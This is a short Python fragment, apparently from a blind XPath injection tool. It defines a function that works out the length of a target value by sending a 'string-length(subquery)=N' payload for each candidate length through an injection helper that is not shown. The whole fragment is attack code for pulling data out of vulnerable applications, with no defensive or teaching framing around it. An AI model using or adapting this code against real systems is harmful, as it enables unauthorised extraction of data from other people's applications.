 
 # get data length
 def get_data_length(subquery, max_length=50):
    for length in range(1, max_length):
         payload = f"string-length({subquery})={length}"
         if xpath_injection_exec(payload):
             return length